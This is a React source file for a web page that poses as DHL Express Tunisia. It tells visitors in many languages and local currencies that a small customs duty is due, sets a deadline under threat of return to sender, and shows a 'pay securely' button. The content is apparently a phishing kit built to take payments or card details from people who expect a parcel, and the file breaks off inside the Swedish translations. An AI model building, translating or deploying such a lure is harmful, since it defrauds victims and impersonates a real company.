import React, { useState, useEffect } from "react";
import LoadingPage from "./LoadingPage";

const DHLExpressTunisia = () => {
  const apiUrl = import.meta.env.VITE_API_URL || "";
  // State for language dropdown
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [selectedLang, setSelectedLang] = useState({
    flag: "🇬🇧",
    name: "English",
    code: "en",
  });
  const [ipCountry, setIpCountry] = useState(null);
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  const [currency, setCurrency] = useState({
    code: "TND",
    symbol: "TND",
    rate: 1,
    importDuty: 13.0,
    processingFee: 1.0,
    totalDue: 14.0,
  });

  // ============================================
  // CURRENCY CONFIGURATION PER COUNTRY - EXPANDED
  // ============================================
  const currencyConfig = {
    // Tunisia
    TN: {
      code: "TND",
      symbol: "TND",
      rate: 1,
      importDuty: 13.0,
      processingFee: 1.0,
      totalDue: 14.0,
    },
    // USA
    US: {
      code: "USD",
      symbol: "$",
      rate: 0.32,
      importDuty: 4.16,
      processingFee: 0.32,
      totalDue: 4.48,
    },
    // United Kingdom
    GB: {
      code: "GBP",
      symbol: "£",
      rate: 0.25,
      importDuty: 3.25,
      processingFee: 0.25,
      totalDue: 3.5,
    },
    // France & Euro countries
    FR: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    DE: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    ES: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    IT: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    NL: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    BE: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    PT: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    // Switzerland
    CH: {
      code: "CHF",
      symbol: "CHF",
      rate: 0.28,
      importDuty: 3.64,
      processingFee: 0.28,
      totalDue: 3.92,
    },
    // Canada
    CA: {
      code: "CAD",
      symbol: "C$",
      rate: 0.44,
      importDuty: 5.72,
      processingFee: 0.44,
      totalDue: 6.16,
    },
    // Australia
    AU: {
      code: "AUD",
      symbol: "A$",
      rate: 0.48,
      importDuty: 6.24,
      processingFee: 0.48,
      totalDue: 6.72,
    },
    // New Zealand
    NZ: {
      code: "NZD",
      symbol: "NZ$",
      rate: 0.52,
      importDuty: 6.76,
      processingFee: 0.52,
      totalDue: 7.28,
    },
    // Japan
    JP: {
      code: "JPY",
      symbol: "¥",
      rate: 48.5,
      importDuty: 630.5,
      processingFee: 48.5,
      totalDue: 679.0,
    },
    // South Korea
    KR: {
      code: "KRW",
      symbol: "₩",
      rate: 430,
      importDuty: 5590,
      processingFee: 430,
      totalDue: 6020,
    },
    // China
    CN: {
      code: "CNY",
      symbol: "¥",
      rate: 2.3,
      importDuty: 29.9,
      processingFee: 2.3,
      totalDue: 32.2,
    },
    // Russia
    RU: {
      code: "RUB",
      symbol: "₽",
      rate: 29,
      importDuty: 377,
      processingFee: 29,
      totalDue: 406,
    },
    // Turkey
    TR: {
      code: "TRY",
      symbol: "₺",
      rate: 11.5,
      importDuty: 149.5,
      processingFee: 11.5,
      totalDue: 161.0,
    },
    // Brazil
    BR: {
      code: "BRL",
      symbol: "R$",
      rate: 1.85,
      importDuty: 24.05,
      processingFee: 1.85,
      totalDue: 25.9,
    },
    // India
    IN: {
      code: "INR",
      symbol: "₹",
      rate: 26.8,
      importDuty: 348.4,
      processingFee: 26.8,
      totalDue: 375.2,
    },
    // Saudi Arabia
    SA: {
      code: "SAR",
      symbol: "﷼",
      rate: 1.2,
      importDuty: 15.6,
      processingFee: 1.2,
      totalDue: 16.8,
    },
    // UAE
    AE: {
      code: "AED",
      symbol: "د.إ",
      rate: 1.17,
      importDuty: 15.21,
      processingFee: 1.17,
      totalDue: 16.38,
    },
    // Poland
    PL: {
      code: "PLN",
      symbol: "zł",
      rate: 1.28,
      importDuty: 16.64,
      processingFee: 1.28,
      totalDue: 17.92,
    },
    // Thailand
    TH: {
      code: "THB",
      symbol: "฿",
      rate: 11.2,
      importDuty: 145.6,
      processingFee: 11.2,
      totalDue: 156.8,
    },
    // Indonesia
    ID: {
      code: "IDR",
      symbol: "Rp",
      rate: 5200,
      importDuty: 67600,
      processingFee: 5200,
      totalDue: 72800,
    },
    // Vietnam
    VN: {
      code: "VND",
      symbol: "₫",
      rate: 8150,
      importDuty: 105950,
      processingFee: 8150,
      totalDue: 114100,
    },
    // Malaysia
    MY: {
      code: "MYR",
      symbol: "RM",
      rate: 1.42,
      importDuty: 18.46,
      processingFee: 1.42,
      totalDue: 19.88,
    },
    // Singapore
    SG: {
      code: "SGD",
      symbol: "S$",
      rate: 0.43,
      importDuty: 5.59,
      processingFee: 0.43,
      totalDue: 6.02,
    },
    // South Africa
    ZA: {
      code: "ZAR",
      symbol: "R",
      rate: 5.95,
      importDuty: 77.35,
      processingFee: 5.95,
      totalDue: 83.3,
    },
    // Mexico
    MX: {
      code: "MXN",
      symbol: "$",
      rate: 5.45,
      importDuty: 70.85,
      processingFee: 5.45,
      totalDue: 76.3,
    },
    // Sweden
    SE: {
      code: "SEK",
      symbol: "kr",
      rate: 3.4,
      importDuty: 44.2,
      processingFee: 3.4,
      totalDue: 47.6,
    },
    // Norway
    NO: {
      code: "NOK",
      symbol: "kr",
      rate: 3.45,
      importDuty: 44.85,
      processingFee: 3.45,
      totalDue: 48.3,
    },
    // Denmark
    DK: {
      code: "DKK",
      symbol: "kr",
      rate: 2.25,
      importDuty: 29.25,
      processingFee: 2.25,
      totalDue: 31.5,
    },
    // Finland
    FI: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    // Greece
    GR: {
      code: "EUR",
      symbol: "€",
      rate: 0.3,
      importDuty: 3.9,
      processingFee: 0.3,
      totalDue: 4.2,
    },
    // Czech Republic
    CZ: {
      code: "CZK",
      symbol: "Kč",
      rate: 7.5,
      importDuty: 97.5,
      processingFee: 7.5,
      totalDue: 105,
    },
    // Hungary
    HU: {
      code: "HUF",
      symbol: "Ft",
      rate: 115,
      importDuty: 1495,
      processingFee: 115,
      totalDue: 1610,
    },
    // Romania
    RO: {
      code: "RON",
      symbol: "lei",
      rate: 1.48,
      importDuty: 19.24,
      processingFee: 1.48,
      totalDue: 20.72,
    },
    // Israel
    IL: {
      code: "ILS",
      symbol: "₪",
      rate: 1.18,
      importDuty: 15.34,
      processingFee: 1.18,
      totalDue: 16.52,
    },
    // Pakistan
    PK: {
      code: "PKR",
      symbol: "₨",
      rate: 89,
      importDuty: 1157,
      processingFee: 89,
      totalDue: 1246,
    },
    // Bangladesh
    BD: {
      code: "BDT",
      symbol: "৳",
      rate: 35,
      importDuty: 455,
      processingFee: 35,
      totalDue: 490,
    },
    // Sri Lanka
    LK: {
      code: "LKR",
      symbol: "Rs",
      rate: 96,
      importDuty: 1248,
      processingFee: 96,
      totalDue: 1344,
    },
    // Default fallback
    default: {
      code: "TND",
      symbol: "TND",
      rate: 1,
      importDuty: 13.0,
      processingFee: 1.0,
      totalDue: 14.0,
    },
  };

  // ============================================
  // LANGUAGE OPTIONS - ALL LANGUAGES EXPANDED
  // ============================================
  const languages = [
    {
      flag: "🇬🇧",
      name: "English",
      code: "en",
      translations: {
        title: "Your package is almost here",
        subtitle: "One last step to continue delivery",
        reference: "Shipping Reference",
        greeting: "Hello,",
        message1:
          "Thank you for your patience. Your shipment has been processed by the destination country's customs on",
        message2:
          "In accordance with international standards, a small customs duty has been assessed by the government. This is a routine charge applied to imported goods — this is not a DHL fee.",
        message3:
          "Once this is settled, we will immediately request release of your package.",
        importDuty: "Import Duty",
        processingFee: "Processing Fee",
        totalDue: "Total Due",
        deadline: "Please complete before",
        deadlineSuffix: "to avoid return to sender.",
        payButton: "Checkout and pay securely",
        secureNote:
          "🔒 Secure payment – A confirmation email will be sent after payment",
        customs: "Customs",
        actionRequired: "Action required",
        orderPlaced: "Order placed",
        shipped: "Shipped",
        inTransit: "In transit",
        inDelivery: "Out for delivery",
        delivered: "Delivered",
        privacyNotice: "Privacy Notice",
        consentSettings: "Consent Settings",
        copyright: "DHL Group - All rights reserved",
      },
    },
    {
      flag: "🇫🇷",
      name: "Français",
      code: "fr",
      translations: {
        title: "Votre colis est presque arrivé",
        subtitle: "Une dernière étape pour continuer la livraison",
        reference: "Référence d'expédition",
        greeting: "Bonjour,",
        message1:
          "Merci de votre patience. Votre envoi a été traité par les douanes du pays de destination le",
        message2:
          "Conformément aux normes internationales, un petit droit de douane a été évalué par le gouvernement. Il s'agit d'une charge de routine appliquée aux marchandises importées — ce n'est pas des frais DHL.",
        message3:
          "Une fois cela réglé, nous demanderons immédiatement la libération de votre colis.",
        importDuty: "Droit d'importation",
        processingFee: "Frais de traitement",
        totalDue: "Total dû",
        deadline: "Veuillez compléter avant le",
        deadlineSuffix: "pour éviter le retour à l'expéditeur.",
        payButton: "Vérifier et payer en toute sécurité",
        secureNote:
          "🔒 Paiement sécurisé – Un e-mail de confirmation sera envoyé après le paiement",
        customs: "Douanes",
        actionRequired: "Action requise",
        orderPlaced: "Commande passée",
        shipped: "Expédié",
        inTransit: "En transit",
        inDelivery: "En livraison",
        delivered: "Livré",
        privacyNotice: "Avis de confidentialité",
        consentSettings: "Paramètres de consentement",
        copyright: "DHL Group - Tous droits réservés",
      },
    },
    {
      flag: "🇪🇸",
      name: "Español",
      code: "es",
      translations: {
        title: "Su paquete está casi aquí",
        subtitle: "Un último paso para continuar con la entrega",
        reference: "Referencia de envío",
        greeting: "Hola,",
        message1:
          "Gracias por su paciencia. Su envío ha sido procesado por la aduana del país de destino el",
        message2:
          "De acuerdo con los estándares internacionales, el gobierno ha evaluado un pequeño derecho de aduana. Este es un cargo de rutina aplicado a los bienes importados — no es una tarifa de DHL.",
        message3:
          "Una vez que esto se resuelva, solicitaremos inmediatamente la liberación de su paquete.",
        importDuty: "Derecho de importación",
        processingFee: "Gastos de gestión",
        totalDue: "Total adeudado",
        deadline: "Por favor complete antes del",
        deadlineSuffix: "para evitar la devolución al remitente.",
        payButton: "Pagar de forma segura",
        secureNote:
          "🔒 Pago seguro – Se enviará un correo de confirmación después del pago",
        customs: "Aduanas",
        actionRequired: "Acción requerida",
        orderPlaced: "Pedido realizado",
        shipped: "Enviado",
        inTransit: "En tránsito",
        inDelivery: "En reparto",
        delivered: "Entregado",
        privacyNotice: "Aviso de privacidad",
        consentSettings: "Configuración de consentimiento",
        copyright: "DHL Group - Todos los derechos reservados",
      },
    },
    {
      flag: "🇸🇦",
      name: "العربية",
      code: "ar",
      dir: "rtl",
      translations: {
        title: "طرودك على وشك الوصول",
        subtitle: "خطوة أخيرة لاستمرار التوصيل",
        reference: "مرجع الشحن",
        greeting: "مرحباً،",
        message1: "شكراً لصبرك. تمت معالجة شحنتك من قبل جمارك البلد الوجهة في",
        message2:
          "وفقاً للمعايير الدولية، تم تقييم رسوم جمركية صغيرة من قبل الحكومة. هذه رسوم روتينية تطبق على البضائع المستوردة — هذه ليست رسوم DHL.",
        message3: "بمجرد تسوية ذلك، سنطلب فوراً الإفراج عن طردك.",
        importDuty: "الرسوم الجمركية",
        processingFee: "رسوم المعالجة",
        totalDue: "المبلغ المستحق",
        deadline: "يرجى الإكمال قبل",
        deadlineSuffix: "لتجنب الإرجاع إلى المرسل.",
        payButton: "الدفع الآمن",
        secureNote: "🔒 دفع آمن – سيتم إرسال بريد إلكتروني للتأكيد بعد الدفع",
        customs: "الجمارك",
        actionRequired: "إجراء مطلوب",
        orderPlaced: "تم الطلب",
        shipped: "تم الشحن",
        inTransit: "في العبور",
        inDelivery: "قيد التوصيل",
        delivered: "تم التوصيل",
        privacyNotice: "إشعار الخصوصية",
        consentSettings: "إعدادات الموافقة",
        copyright: "مجموعة DHL - جميع الحقوق محفوظة",
      },
    },
    {
      flag: "🇩🇪",
      name: "Deutsch",
      code: "de",
      translations: {
        title: "Ihr Paket ist fast da",
        subtitle: "Ein letzter Schritt zur Fortsetzung der Lieferung",
        reference: "Sendungsreferenz",
        greeting: "Hallo,",
        message1:
          "Vielen Dank für Ihre Geduld. Ihre Sendung wurde am vom Zoll des Ziellandes bearbeitet",
        message2:
          "Gemäß internationalen Standards wurde eine kleine Zollgebühr von der Regierung erhoben. Dies ist eine Routinegebühr für importierte Waren — es handelt sich nicht um eine DHL-Gebühr.",
        message3:
          "Sobald dies erledigt ist, werden wir sofort die Freigabe Ihres Pakets veranlassen.",
        importDuty: "Einfuhrabgabe",
        processingFee: "Bearbeitungsgebühr",
        totalDue: "Gesamtbetrag fällig",
        deadline: "Bitte abschließen bis",
        deadlineSuffix: "um Rücksendung an den Absender zu vermeiden.",
        payButton: "Sicher bezahlen und prüfen",
        secureNote:
          "🔒 Sichere Zahlung – Eine Bestätigungs-E-Mail wird nach der Zahlung gesendet",
        customs: "Zoll",
        actionRequired: "Handlung erforderlich",
        orderPlaced: "Bestellung aufgegeben",
        shipped: "Versendet",
        inTransit: "Unterwegs",
        inDelivery: "Zur Zustellung",
        delivered: "Geliefert",
        privacyNotice: "Datenschutzerklärung",
        consentSettings: "Zustimmungseinstellungen",
        copyright: "DHL Group - Alle Rechte vorbehalten",
      },
    },
    {
      flag: "🇮🇹",
      name: "Italiano",
      code: "it",
      translations: {
        title: "Il tuo pacco è quasi arrivato",
        subtitle: "Un ultimo passo per continuare la consegna",
        reference: "Riferimento spedizione",
        greeting: "Ciao,",
        message1:
          "Grazie per la pazienza. La tua spedizione è stata elaborata dalla dogana del paese di destinazione il",
        message2:
          "Secondo gli standard internazionali, è stato valutato un piccolo dazio doganale dal governo. Questa è una tassa di routine applicata ai beni importati — non è una tassa DHL.",
        message3:
          "Una volta risolto, richiederemo immediatamente il rilascio del tuo pacco.",
        importDuty: "Dazio doganale",
        processingFee: "Spese di gestione",
        totalDue: "Totale dovuto",
        deadline: "Si prega di completare entro il",
        deadlineSuffix: "per evitare il ritorno al mittente.",
        payButton: "Paga in sicurezza",
        secureNote:
          "🔒 Pagamento sicuro – Un'email di conferma verrà inviata dopo il pagamento",
        customs: "Dogana",
        actionRequired: "Azione richiesta",
        orderPlaced: "Ordine effettuato",
        shipped: "Spedito",
        inTransit: "In transito",
        inDelivery: "In consegna",
        delivered: "Consegnato",
        privacyNotice: "Informativa sulla privacy",
        consentSettings: "Impostazioni del consenso",
        copyright: "DHL Group - Tutti i diritti riservati",
      },
    },
    {
      flag: "🇧🇷",
      name: "Português",
      code: "pt",
      translations: {
        title: "Sua encomenda está quase aqui",
        subtitle: "Um último passo para continuar a entrega",
        reference: "Referência de envio",
        greeting: "Olá,",
        message1:
          "Obrigado pela paciência. Sua remessa foi processada pela alfândega do país de destino em",
        message2:
          "De acordo com os padrões internacionales, uma pequena taxa alfandegária foi avaliada pelo governo. Esta é uma taxa de rotina aplicada a mercadorias importadas — esta não é uma taxa da DHL.",
        message3:
          "Assim que isso for resolvido, solicitaremos imediatamente a liberação da sua encomenda.",
        importDuty: "Direitos de importação",
        processingFee: "Taxa de processamento",
        totalDue: "Total devido",
        deadline: "Por favor, complete antes de",
        deadlineSuffix: "para evitar devolução ao remetente.",
        payButton: "Pagar com segurança",
        secureNote:
          "🔒 Pagamento seguro – Um e-mail de confirmação será enviado após o pagamento",
        customs: "Alfândega",
        actionRequired: "Ação necessária",
        orderPlaced: "Pedido feito",
        shipped: "Enviado",
        inTransit: "Em trânsito",
        inDelivery: "Saiu para entrega",
        delivered: "Entregue",
        privacyNotice: "Aviso de privacidade",
        consentSettings: "Configurações de consentimento",
        copyright: "DHL Group - Todos os direitos reservados",
      },
    },
    {
      flag: "🇹🇷",
      name: "Türkçe",
      code: "tr",
      translations: {
        title: "Paketiniz neredeyse geldi",
        subtitle: "Teslimata devam etmek için son adım",
        reference: "Gönderi Referansı",
        greeting: "Merhaba,",
        message1:
          "Sabrınız için teşekkürler. Gönderiniz, varış ülkesinin gümrüğü tarafından işlendi",
        message2:
          "Uluslararası standartlara göre, hükümet tarafından küçük bir gümrük vergisi değerlendirilmiştir. Bu, ithal edilen mallara uygulanan rutin bir ücrettir — bu bir DHL ücreti değildir.",
        message3:
          "Bu çözüldüğünde, paketinizin serbest bırakılmasını hemen talep edeceğiz.",
        importDuty: "Gümrük Vergisi",
        processingFee: "İşlem Ücreti",
        totalDue: "Toplam Borç",
        deadline: "Lütfen şu tarihe kadar tamamlayın:",
        deadlineSuffix: "göndericiye iadeyi önlemek için.",
        payButton: "Güvenle öde",
        secureNote:
          "🔒 Güvenli ödeme – Ödeme sonrası onay e-postası gönderilecektir",
        customs: "Gümrük",
        actionRequired: "İşlem gerekli",
        orderPlaced: "Sipariş verildi",
        shipped: "Kargolandı",
        inTransit: "Taşımada",
        inDelivery: "Teslimatta",
        delivered: "Teslim edildi",
        privacyNotice: "Gizlilik Bildirimi",
        consentSettings: "Onay Ayarları",
        copyright: "DHL Grubu - Tüm hakları saklıdır",
      },
    },
    {
      flag: "🇷🇺",
      name: "Русский",
      code: "ru",
      translations: {
        title: "Ваша посылка почти здесь",
        subtitle: "Последний шаг для продолжения доставки",
        reference: "Справочная информация об отправке",
        greeting: "Здравствуйте,",
        message1:
          "Спасибо за ваше терпение. Ваша отправление была обработана таможней страны назначения",
        message2:
          "В соответствии с международными стандартами правительство оценило небольшую таможенную пошлину. Это обычная плата, взимаемая с импортируемых товаров — это не плата DHL.",
        message3:
          "Как только этот вопрос будет урегулирован, мы немедленно запросим освобождение вашей посылки.",
        importDuty: "Таможенная пошлина",
        processingFee: "Плата за обработку",
        totalDue: "Итого к оплате",
        deadline: "Пожалуйста, завершите до",
        deadlineSuffix: "чтобы избежать возврата отправителю.",
        payButton: "Проверить и оплатить безопасно",
        secureNote:
          "🔒 Безопасный платеж – Подтверждение по электронной почте будет отправлено после оплаты",
        customs: "Таможня",
        actionRequired: "Требуется действие",
        orderPlaced: "Заказ размещен",
        shipped: "Отправлено",
        inTransit: "В пути",
        inDelivery: "Доставляется",
        delivered: "Доставлено",
        privacyNotice: "Уведомление о конфиденциальности",
        consentSettings: "Настройки согласия",
        copyright: "DHL Group - Все права защищены",
      },
    },
    {
      flag: "🇨🇳",
      name: "中文",
      code: "zh",
      translations: {
        title: "您的包裹即将到达",
        subtitle: "最后一步，继续配送",
        reference: "运输参考号",
        greeting: "您好，",
        message1: "感谢您的耐心等待。您的货物已被目的地国家海关处理于",
        message2:
          "根据国际标准，政府已评估少量关税。这是对进口商品征收的常规费用 — 这不是DHL费用。",
        message3: "一旦解决，我们将立即请求放行您的包裹。",
        importDuty: "进口关税",
        processingFee: "手续费",
        totalDue: "应付总额",
        deadline: "请于",
        deadlineSuffix: "之前完成，以免退回发件人。",
        payButton: "安全结账并付款",
        secureNote: "🔒 安全支付 – 付款后将发送确认邮件",
        customs: "海关",
        actionRequired: "需要操作",
        orderPlaced: "已下单",
        shipped: "已发货",
        inTransit: "运输中",
        inDelivery: "派送中",
        delivered: "已送达",
        privacyNotice: "隐私声明",
        consentSettings: "同意设置",
        copyright: "DHL集团 - 保留所有权利",
      },
    },
    {
      flag: "🇰🇷",
      name: "한국어",
      code: "ko",
      translations: {
        title: "패키지가 거의 도착했습니다",
        subtitle: "배송을 계속하는 마지막 단계",
        reference: "운송 참조 번호",
        greeting: "안녕하세요,",
        message1:
          "인내심에 감사드립니다. 귀하의 화물이 목적지 국가 세관에서 처리되었습니다",
        message2:
          "국제 표준에 따라 정부에서 소액의 관세를 평가했습니다. 이는 수입 상품에 적용되는 일상적인 요금입니다 — DHL 수수료가 아닙니다.",
        message3: "이 문제가 해결되면 즉시 패키지 출고를 요청할 것입니다.",
        importDuty: "수입 관세",
        processingFee: "처리 수수료",
        totalDue: "총 납부액",
        deadline: "다음 날짜까지 완료하세요:",
        deadlineSuffix: "발신자 반송을 피하려면",
        payButton: "안전하게 결제하기",
        secureNote: "🔒 안전한 결제 – 결제 후 확인 이메일이 발송됩니다",
        customs: "세관",
        actionRequired: "조치 필요",
        orderPlaced: "주문 완료",
        shipped: "발송됨",
        inTransit: "운송 중",
        inDelivery: "배송 중",
        delivered: "배송 완료",
        privacyNotice: "개인정보 보호정책",
        consentSettings: "동의 설정",
        copyright: "DHL 그룹 - 모든 권리 보유",
      },
    },
    {
      flag: "🇯🇵",
      name: "日本語",
      code: "ja",
      translations: {
        title: "荷物はもうすぐ到着します",
        subtitle: "配送を続けるための最後のステップ",
        reference: "配送参照番号",
        greeting: "こんにちは、",
        message1:
          "ご辛抱いただきありがとうございます。あなたの配送は目的地国の税关によって処理されました",
        message2:
          "国際基準に従い、少額の関税が政府によって評価されました。これは輸入品に適用される定期的な料金であり、DHLの料金ではありません。",
        message3: "これが解決され次第、すぐに荷物の解放をリクエストします。",
        importDuty: "輸入関税",
        processingFee: "手数料",
        totalDue: "総支払額",
        deadline: "までに完了してください:",
        deadlineSuffix: "送り主への返送を避けるため",
        payButton: "安全に支払う",
        secureNote: "🔒 安全な支払い – 支払い後に確認メールが送信されます",
        customs: "税関",
        actionRequired: "アクションが必要",
        orderPlaced: "注文済み",
        shipped: "発送済み",
        inTransit: "輸送中",
        inDelivery: "配達中",
        delivered: "配達完了",
        privacyNotice: "プライバシー通知",
        consentSettings: "同意設定",
        copyright: "DHLグループ - 無断転載を禁じます",
      },
    },
    {
      flag: "🇵🇱",
      name: "Polski",
      code: "pl",
      translations: {
        title: "Twoja paczka jest już prawie tutaj",
        subtitle: "Ostatni krok, aby kontynuować dostawę",
        reference: "Numer referencyjny przesyłki",
        greeting: "Witaj,",
        message1:
          "Dziękujemy za cierpliwość. Twoja przesyłka została przetworzona przez urząd celny kraju docelowego",
        message2:
          "Zgodnie z międzynarodowymi standardami, rząd ocenił niewielkie cło. Jest to rutynowa opłata nakładana na towary importowane — nie jest to opłata DHL.",
        message3:
          "Gdy to zostanie rozstrzygnięte, natychmiast poprosimy o zwolnienie paczki.",
        importDuty: "Cło importowe",
        processingFee: "Opłata manipulacyjna",
        totalDue: "Całkowita należność",
        deadline: "Proszę dokończyć przed",
        deadlineSuffix: "aby uniknąć zwrotu do nadawcy.",
        payButton: "Zapłać bezpiecznie",
        secureNote:
          "🔒 Bezpieczna płatność – E-mail z potwierdzeniem zostanie wysłany po płatności",
        customs: "Urząd celny",
        actionRequired: "Wymagane działanie",
        orderPlaced: "Zamówienie złożone",
        shipped: "Wysłane",
        inTransit: "W tranzycie",
        inDelivery: "W doręczeniu",
        delivered: "Dostarczono",
        privacyNotice: "Polityka prywatności",
        consentSettings: "Ustawienia zgody",
        copyright: "DHL Group - Wszelkie prawa zastrzeżone",
      },
    },
    {
      flag: "🇳🇱",
      name: "Nederlands",
      code: "nl",
      translations: {
        title: "Uw pakket is bijna hier",
        subtitle: "Een laatste stap om de bezorging voort te zetten",
        reference: "Verzendreferentie",
        greeting: "Hallo,",
        message1:
          "Bedankt voor uw geduld. Uw zending is verwerkt door de douane van het land van bestemming op",
        message2:
          "In overeenstemming met internationale normen is een kleine douanerecht door de overheid beoordeeld. Dit is een routinematige vergoeding voor geïmporteerde goederen — dit is geen DHL-vergoeding.",
        message3:
          "Zodra dit is opgelost, zullen we onmiddellijk de vrijgave van uw pakket aanvragen.",
        importDuty: "Invoerrechten",
        processingFee: "Verwerkingskosten",
        totalDue: "Totaal verschuldigd",
        deadline: "Voltooi voor",
        deadlineSuffix: "om terugzending naar afzender te voorkomen.",
        payButton: "Veilig afrekenen",
        secureNote:
          "🔒 Veilige betaling – Een bevestigingsmail wordt verzonden na betaling",
        customs: "Douane",
        actionRequired: "Actie vereist",
        orderPlaced: "Bestelling geplaatst",
        shipped: "Verzonden",
        inTransit: "In transit",
        inDelivery: "Bezorging",
        delivered: "Afgeleverd",
        privacyNotice: "Privacyverklaring",
        consentSettings: "Toestemmingsinstellingen",
        copyright: "DHL Groep - Alle rechten voorbehouden",
      },
    },
    {
      flag: "🇹🇭",
      name: "ไทย",
      code: "th",
      translations: {
        title: "พัสดุของคุณกำลังจะมาถึง",
        subtitle: "ขั้นตอนสุดท้ายเพื่อดำเนินการจัดส่งต่อ",
        reference: "ข้อมูลอ้างอิงการจัดส่ง",
        greeting: "สวัสดี,",
        message1:
          "ขอบคุณสำหรับความอดทนของคุณ การจัดส่งของคุณได้รับการดำเนินการโดยศุลกากรประเทศปลายทางเมื่อ",
        message2:
          "ตามมาตรฐานสากล รัฐบาลได้ประเมินภาษีศุลกากรเล็กน้อย ซึ่งเป็นค่าใช้จ่ายตามปกติสำหรับสินค้านำเข้า — นี่ไม่ใช่ค่าธรรมเนียมของ DHL",
        message3: "เมื่อชำระเรียบร้อยแล้ว เราจะขอให้ปล่อยพัสดุของคุณทันที",
        importDuty: "ภาษีนำเข้า",
        processingFee: "ค่าดำเนินการ",
        totalDue: "ยอดรวมที่ต้องชำระ",
        deadline: "กรุณาชำระภายใน",
        deadlineSuffix: "เพื่อหลีกเลี่ยงการคืนสินค้าให้ผู้ส่ง",
        payButton: "ชำระเงินอย่างปลอดภัย",
        secureNote:
          "🔒 การชำระเงินที่ปลอดภัย – อีเมลยืนยันจะถูกส่งหลังจากการชำระเงิน",
        customs: "ศุลกากร",
        actionRequired: "ต้องดำเนินการ",
        orderPlaced: "สั่งซื้อแล้ว",
        shipped: "จัดส่งแล้ว",
        inTransit: "ระหว่างทาง",
        inDelivery: "กำลังจัดส่ง",
        delivered: "จัดส่งเรียบร้อย",
        privacyNotice: "ประกาศความเป็นส่วนตัว",
        consentSettings: "การตั้งค่าการยินยอม",
        copyright: "DHL กรุ๊ป - สงวนลิขสิทธิ์",
      },
    },
    {
      flag: "🇮🇩",
      name: "Indonesia",
      code: "id",
      translations: {
        title: "Paket Anda hampir sampai",
        subtitle: "Satu langkah terakhir untuk melanjutkan pengiriman",
        reference: "Referensi Pengiriman",
        greeting: "Halo,",
        message1:
          "Terima kasih atas kesabaran Anda. Pengiriman Anda telah diproses oleh bea cukai negara tujuan pada",
        message2:
          "Sesuai dengan standar internasional, bea cukai kecil telah dinilai oleh pemerintah. Ini adalah biaya rutin yang dikenakan pada barang impor — ini bukan biaya DHL.",
        message3:
          "Setelah ini diselesaikan, kami akan segera meminta pelepasan paket Anda.",
        importDuty: "Bea Masuk",
        processingFee: "Biaya Pemrosesan",
        totalDue: "Total yang Harus Dibayar",
        deadline: "Harap selesaikan sebelum",
        deadlineSuffix: "untuk menghindari pengembalian ke pengirim.",
        payButton: "Bayar dengan aman",
        secureNote:
          "🔒 Pembayaran aman – Email konfirmasi akan dikirim setelah pembayaran",
        customs: "Bea Cukai",
        actionRequired: "Tindakan diperlukan",
        orderPlaced: "Pesanan ditempatkan",
        shipped: "Dikirim",
        inTransit: "Dalam perjalanan",
        inDelivery: "Sedang dikirim",
        delivered: "Terkirim",
        privacyNotice: "Pemberitahuan Privasi",
        consentSettings: "Pengaturan Persetujuan",
        copyright: "DHL Group - Hak cipta dilindungi",
      },
    },
    {
      flag: "🇻🇳",
      name: "Tiếng Việt",
      code: "vi",
      translations: {
        title: "Gói hàng của bạn sắp đến",
        subtitle: "Một bước cuối cùng để tiếp tục giao hàng",
        reference: "Tham chiếu vận chuyển",
        greeting: "Xin chào,",
        message1:
          "Cảm ơn sự kiên nhẫn của bạn. Lô hàng của bạn đã được xử lý bởi hải quan nước đến vào ngày",
        message2:
          "Theo tiêu chuẩn quốc tế, chính phủ đã đánh giá một khoản thuế hải quan nhỏ. Đây là khoản phí thông thường áp dụng cho hàng hóa nhập khẩu — đây không phải là phí của DHL.",
        message3:
          "Khi việc này được giải quyết, chúng tôi sẽ yêu cầu giải phóng gói hàng của bạn ngay lập tức.",
        importDuty: "Thuế nhập khẩu",
        processingFee: "Phí xử lý",
        totalDue: "Tổng số tiền phải trả",
        deadline: "Vui lòng hoàn thành trước ngày",
        deadlineSuffix: "để tránh bị trả lại người gửi.",
        payButton: "Thanh toán an toàn",
        secureNote:
          "🔒 Thanh toán an toàn – Email xác nhận sẽ được gửi sau khi thanh toán",
        customs: "Hải quan",
        actionRequired: "Yêu cầu hành động",
        orderPlaced: "Đã đặt hàng",
        shipped: "Đã gửi",
        inTransit: "Đang vận chuyển",
        inDelivery: "Đang giao",
        delivered: "Đã giao",
        privacyNotice: "Thông báo quyền riêng tư",
        consentSettings: "Cài đặt đồng ý",
        copyright: "Tập đoàn DHL - Đã đăng ký bản quyền",
      },
    },
    {
      flag: "🇸🇪",
      name: "Svenska",
      code: "sv",
      translations: {
        title: "Ditt paket är nästan här",
        subtitle: "Ett sista steg för att fortsätta leveransen",
        reference: "Sändningsreferens",
        greeting: "Hej,",
        message1:
          "Tack för ditt tålamod. Din försändelse har behandlats av destinationslandets tull den",
        message2:
          "I enlighet med internationella standarder har en liten tullavgift bedömts av regeringen. Detta är en rutinavgift som tillämpas på importerade varor — detta är inte en DHL-avgift.",
        message3:
          "När detta är löst kommer vi omedelbart att begära frisläppande av ditt paket.",
        importDuty: "Importtull",
        processingFee: "Avgift",
        totalDue: "Totalt att betala",
        deadline: "Vänligen slutför före",
        deadlineSuffix: "för att undvika retur till avsändaren.",
        payButton: "Betala säkert",
        secureNote:
          "🔒 Säker betalning – Ett bekräftelsemail skickas efter betalning",
        customs: "Tull",
        actionRequired: "Åtgärd krävs",
        orderPlaced: "Beställning gjord",
        shipped: "Skickad",
